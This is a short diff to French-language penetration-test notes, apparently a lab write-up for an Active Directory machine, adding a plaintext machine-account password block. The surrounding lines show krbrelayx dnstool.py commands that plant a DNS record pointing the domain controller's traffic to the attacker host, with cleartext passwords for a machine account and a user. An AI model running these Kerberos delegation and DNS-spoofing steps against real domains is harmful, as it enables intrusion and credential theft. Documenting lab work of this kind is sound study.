@@ -39,6 +39,12 @@ Get-ADComputer -Identity "PwnPC" -Properties TrustedForDelegation | Select-Objec
 ### D. Configuration DNS et SPN
 ref outil : https://github.com/dirkjanm/krbrelayx
 Attention au mot de passe qui aurrait pu etre changé lors de l'ajout du PwnPC
+
+```
+PwnPC$:P@7700word123!
+```
+
+
 ```bash
 python dnstool.py -u 'delegate.vl\PwnPC$' -p 'P@7700word123!' -r PwnPC.delegate.vl -d 10.10.14.136 --action add -dns-ip 10.129.234.69 dc1.delegate.vl
 python dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r PwnPC.delegate.vl -a add -t A -d 10.10.14.136 -dns-ip 10.129.234.69 DC1.delegate.vl
